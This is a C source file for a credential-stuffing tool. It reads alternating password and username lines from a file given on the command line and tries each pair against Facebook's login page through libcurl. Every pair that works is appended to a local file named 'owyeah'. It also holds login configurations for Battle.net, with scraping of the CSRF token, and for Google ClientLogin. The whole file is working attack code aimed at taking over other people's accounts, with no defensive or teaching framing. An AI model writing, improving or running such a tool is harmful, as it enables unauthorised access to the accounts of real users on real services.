#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <regex.h>
#include <curl/curl.h>

#include "connect.h"
#include "bddParser.h"


int main(int argc,char** argv){
	website facebook, bnet, google;

	//Some configuration options
	facebook.name = "facebook";
	facebook.method = POST;
	facebook.regex_login = "Story options";
	facebook.regex_token = NULL;
	facebook.data = "email=%s&pass=%s";
	facebook.action = "http://www.facebook.com/login.php";
	facebook.form = "http://www.facebook.com/login.php";
	facebook.connect_first = 1;

	bnet.name = "bnet";
	bnet.method = POST;
	bnet.regex_login = "Welcome";
	bnet.regex_token = "<input type=\"hidden\" id=\"csrftoken\" name=\"csrftoken\" value=\"(.+)\" />";
	bnet.data = "accountName=%s&password=%s&persistLogin=off&csrftoken=%s";
	bnet.action = "http://eu.battle.net/login/en-us/index";
	bnet.form = "http://eu.battle.net/login/en-us/index";
	bnet.connect_first = 0;

	google.name = "google";
	google.method = GET;
	google.regex_login = "Info=WebLoginRequired";
	google.regex_token = NULL;
	google.data = "Email=%s&Passwd=%s";
	google.action = "https://www.google.com/accounts/ClientLogin";
	google.form = "https://www.google.com/accounts/ClientLogin";
	google.connect_first = 0;

	/* TEST HERE WITH YOUR mail/pass
	char* user = "test@test.fr";
	char* password = "test";
    // Whatever ..
		
	if(!try_login(user, password, &facebook))
		printf("%s : fail\n", facebook.name);
	else
		printf("%s works!\n", facebook.name);

	if(!try_login(user, password, &bnet))
		printf("%s : fail\n", bnet.name);
	else
		printf("%s : works!\n", bnet.name);

	if(!try_login(user, password, &google))
		printf("%s : fail\n", google.name);
	else
		printf("%s : works!\n", google.name);	
	*/

	struct line_reader lr;FILE *f;size_t len;char *line;
	/*Open the DataBaseFile*/
	f = fopen(argv[1], "r");
	if (f == NULL) {
		perror("foobar.txt");exit(1);
	}

	FILE* fdWork;
	lr_init(&lr, f);
	
	char* password;char* user;
	int cmpt=0;int i;
	while (line = next_line(&lr, &len)) {
		cmpt++;			
		if(cmpt==1){
			password = calloc ( 0 , sizeof(char) );
			password=realloc(password,len);
			for(i=0;i<len-1;i++)
				password[i]=line[i];
			printf("LA : %s\n",password);
		}
		if(cmpt==2){
			user = calloc ( 0 , sizeof(char) );
			user=realloc(user,len);
			for(i=0;i<len-1;i++)
				user[i]=line[i];
			
			printf("LA : %s\n",user);
			if(!try_login(user, password, &facebook))
				printf("%s : fail\n", facebook.name);
			else{
				fdWork = fopen("owyeah","a");
				printf("FB : works!\n");
				fputs("\n", fdWork);
				fputs(user, fdWork);
				fputs(" : ", fdWork);
				fputs(password, fdWork);
				fclose(fdWork);
			}
			cmpt=0;
		}
	}
	if (!feof(f)) {
		perror("next_line");
		exit(1);
	}
	lr_free(&lr); 

	if(!try_login(user, password, &facebook))
		printf("%s : fail\n", facebook.name);
	else
		printf("%s works!\n", facebook.name);

	if(!try_login(user, password, &bnet))
		printf("%s : fail\n", bnet.name);
	else
		printf("%s : works!\n", bnet.name);

	if(!try_login(user, password, &google))
		printf("%s : fail\n", google.name);
	else
		printf("%s : works!\n", google.name);

	return 0;
}
